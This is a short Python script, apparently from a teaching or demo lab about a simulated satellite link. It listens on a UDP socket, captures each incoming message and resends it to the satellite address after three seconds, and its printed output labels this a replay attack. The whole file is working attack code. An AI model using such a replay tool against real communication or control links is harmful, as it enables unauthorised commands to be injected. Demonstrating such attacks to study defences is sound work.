#!/usr/bin/env python3
from common import SAT_ADDR, MISC_ADDR
from time import ctime, sleep
from socket import socket, AF_INET, SOCK_DGRAM


# Create the socket
sock = socket(AF_INET, SOCK_DGRAM)
sock.bind(MISC_ADDR)

# Listen for messages
while True:
    message, recv_ok = sock.recvfrom(4096)
    print(f'[{ctime()}]: Got message with {len(message)} bytes!')

    print('Waiting a bit before attempting replay attack...')
    sleep(3)

    print(f'Resending message: {message}')
    sock.sendto(message, SAT_ADDR)
